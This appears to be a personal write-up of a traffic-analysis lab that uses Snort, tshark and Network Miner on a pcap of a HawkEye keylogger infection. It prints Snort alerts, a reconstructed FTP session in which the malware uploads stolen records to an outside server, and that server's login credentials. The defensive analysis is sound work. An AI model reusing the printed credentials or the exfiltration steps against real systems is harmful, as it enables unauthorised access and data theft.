## Network Traffic Analysis 

> Quick Mode
I already learned some analysis using Wireshark [here!](http://location-href.com/dfir/)

**Picking a Lab**
I have decided to use [this exercise](http://www.malware-traffic-analysis.net/2019/05/02/index.html)

**Tools**

Network Miner [ [Community Edition](https://www.netresec.com/?page=Networkminer) ]
Snort Installation on Windows [Video](https://www.youtube.com/watch?v=RwWM0srLSg0)

**Tasks**
```
+Executive summary:
	On 2019-05-02 at ??:?? UTC, a Windows host used by ????????? was infected with ???????

+Details of the infected Windows host:
	IP address:  
	MAC address:  
	Host name:  
	Windows user account name:

+Indicators of Compromise:
	[List of URLs, domains, IP addresses, and SHA256 hashes related to the infection should appear in this section]
```
They provided alert files in challenge, but i need to detect like this. So i searched at google and test until the right one. 

**Threat Detection with Snort IDS**

Snort Rules
```
https://github.com/thereisnotime/Snort-Rules
```
ET Rules for Snort [ [How to](http://snort-ids.blogspot.com/2013/09/emerging-threats-rules-for-snort.html) ]
```
https://rules.emergingthreats.net/open/snort-2.9.0/
```
Snort Test
 - Don't forget to change network range in snort.conf
 - `ipvar HOME_NET 10.0.0.0/8` ( we can't detect if we don't configure this )
```
snort -r 2019-05-02-traffic-analysis-exercise.pcap -c C:\Snort\etc\snort.conf -T
```
Pcap Analysis with Snort

```
snort -r 2019-05-02-traffic-analysis-exercise.pcap -c C:\Snort\etc\snort.conf
```
Alert.ids
```
D:\Network Analysis\BEGUILESOFT>cat C:\Snort\log\alert.ids
[**] [129:12:1] Consecutive TCP small segments exceeding threshold [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
05/03-04:06:03.172917 10.0.0.10:445 -> 10.0.0.227:49194
TCP TTL:128 TOS:0x0 ID:9007 IpLen:20 DgmLen:41 DF
***A**** Seq: 0x7762B279  Ack: 0xBBCE31E5  Win: 0xFC  TcpLen: 20

[**] [129:15:1] Reset outside window [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
05/03-04:06:09.366061 10.0.0.227:49193 -> 10.0.0.10:135
TCP TTL:128 TOS:0x0 ID:303 IpLen:20 DgmLen:40 DF
*****R** Seq: 0xCE082306  Ack: 0xCE082306  Win: 0x0  TcpLen: 20

[**] [129:12:1] Consecutive TCP small segments exceeding threshold [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
05/03-04:06:17.836582 10.0.0.10:445 -> 10.0.0.227:49215
TCP TTL:128 TOS:0x0 ID:9117 IpLen:20 DgmLen:41 DF
***A**** Seq: 0x76517EE  Ack: 0xEE01F75C  Win: 0xFB  TcpLen: 20

[**] [129:12:1] Consecutive TCP small segments exceeding threshold [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
05/03-04:06:25.855232 10.0.0.10:445 -> 10.0.0.227:49215
TCP TTL:128 TOS:0x0 ID:9122 IpLen:20 DgmLen:41 DF
***A**** Seq: 0x76517EE  Ack: 0xEE01F75C  Win: 0xFB  TcpLen: 20

[**] [129:15:1] Reset outside window [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
05/03-04:06:31.877027 10.0.0.10:445 -> 10.0.0.227:49215
TCP TTL:128 TOS:0x0 ID:9125 IpLen:20 DgmLen:40 DF
***A*R** Seq: 0x76517EF  Ack: 0xEE01F75C  Win: 0x0  TcpLen: 20

[**] [1:33886:1] MALWARE-CNC WIn.Trojan.HawkEye keylogger variant outbound connection [**]
[Classification: A Network Trojan was detected] [Priority: 1]
05/03-04:06:35.419018 10.0.0.227:49205 -> 145.14.145.4:21
TCP TTL:128 TOS:0x0 ID:404 IpLen:20 DgmLen:119 DF
***AP*** Seq: 0xAA9418B5  Ack: 0x55E1BA02  Win: 0xF98C  TcpLen: 20
[Xref => http://www.virustotal.com/en/file/ab7a8e2e7ca3fb87da79774e93be4c9a7a50a6a6f6b479c4cc13dc72416895fa/analysis/]

[**] [1:2020410:4] ET TROJAN HawkEye Keylogger FTP [**]
[Classification: A Network Trojan was detected] [Priority: 1]
05/03-04:06:35.419018 10.0.0.227:49205 -> 145.14.145.4:21
TCP TTL:128 TOS:0x0 ID:404 IpLen:20 DgmLen:119 DF
***AP*** Seq: 0xAA9418B5  Ack: 0x55E1BA02  Win: 0xF98C  TcpLen: 20
[Xref => md5 85f3b302afa0989a91053af6092f3882]

[**] [129:15:1] Reset outside window [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
05/03-04:06:54.353115 10.0.0.227:49207 -> 10.0.0.10:135
TCP TTL:128 TOS:0x0 ID:422 IpLen:20 DgmLen:40 DF
*****R** Seq: 0x74D5AD9A  Ack: 0x74D5AD9A  Win: 0x0  TcpLen: 20

[**] [1:33886:1] MALWARE-CNC WIn.Trojan.HawkEye keylogger variant outbound connection [**]
[Classification: A Network Trojan was detected] [Priority: 1]
05/03-04:16:28.030721 10.0.0.227:49209 -> 145.14.144.10:21
TCP TTL:128 TOS:0x0 ID:474 IpLen:20 DgmLen:120 DF
***AP*** Seq: 0x9003AF99  Ack: 0x443ADCDC  Win: 0xF98A  TcpLen: 20
[Xref => http://www.virustotal.com/en/file/ab7a8e2e7ca3fb87da79774e93be4c9a7a50a6a6f6b479c4cc13dc72416895fa/analysis/]

[**] [1:2020410:4] ET TROJAN HawkEye Keylogger FTP [**]
[Classification: A Network Trojan was detected] [Priority: 1]
05/03-04:16:28.030721 10.0.0.227:49209 -> 145.14.144.10:21
TCP TTL:128 TOS:0x0 ID:474 IpLen:20 DgmLen:120 DF
***AP*** Seq: 0x9003AF99  Ack: 0x443ADCDC  Win: 0xF98A  TcpLen: 20
[Xref => md5 85f3b302afa0989a91053af6092f3882]

[**] [1:33886:1] MALWARE-CNC WIn.Trojan.HawkEye keylogger variant outbound connection [**]
[Classification: A Network Trojan was detected] [Priority: 1]
05/03-04:31:34.453185 10.0.0.227:49213 -> 145.14.145.99:21
TCP TTL:128 TOS:0x0 ID:2828 IpLen:20 DgmLen:121 DF
***AP*** Seq: 0x5D9480C2  Ack: 0x77533E8F  Win: 0xF98A  TcpLen: 20
[Xref => http://www.virustotal.com/en/file/ab7a8e2e7ca3fb87da79774e93be4c9a7a50a6a6f6b479c4cc13dc72416895fa/analysis/]

[**] [1:2020410:4] ET TROJAN HawkEye Keylogger FTP [**]
[Classification: A Network Trojan was detected] [Priority: 1]
05/03-04:31:34.453185 10.0.0.227:49213 -> 145.14.145.99:21
TCP TTL:128 TOS:0x0 ID:2828 IpLen:20 DgmLen:121 DF
***AP*** Seq: 0x5D9480C2  Ack: 0x77533E8F  Win: 0xF98A  TcpLen: 20
[Xref => md5 85f3b302afa0989a91053af6092f3882]
```
**Extracting Data with Network Miner**

Using Network Miner is easy to collect information Hostname, File Carving, Username ,etc ...

HTTP Requests
```
D:\Network Analysis\BEGUILESOFT>tshark -r 2019-05-02-traffic-analysis-exercise.pcap -Y "http.request && ip.src==10.0.0.227" -Tfields -e http.host
www.msftncsi.com
whatismyipaddress.com
```
According to Snort Alert infection was occured in FTP 
Wireshark TCP stream for FTP
```
220 ProFTPD Server (000webhost.com) [::ffff:145.14.145.4]

USER snifferzett

331 User snifferzett OK. Password required

PASS trible22

230-Your bandwidth usage is restricted

230 OK. Current restricted directory is /

OPTS utf8 on

200 OK, UTF-8 enabled

PWD

257 "/" is your current location

CWD /

250 OK. Current directory is /

TYPE I

200 TYPE is now 8-bit binary

PASV

227 Entering Passive Mode (145,14,145,4,145,160).

STOR HawkEye_Keylogger_Stealer_Records_BREAUX-WIN7-PC 5.2.2019 9:36:28 PM.txt

150 Connecting to port 38174

226-File successfully transferred

226 0.073 seconds (measured here), 37.38 Kbytes per second

421 Idle timeout (30 seconds): closing control connection
```
What is taken by Stealer?
 - In Network Miner files tab
```
ClipBoard Data
Mail Passwords Data
Keylogged Data
Screenshot of Desktop
Screenshot of Document Word
```
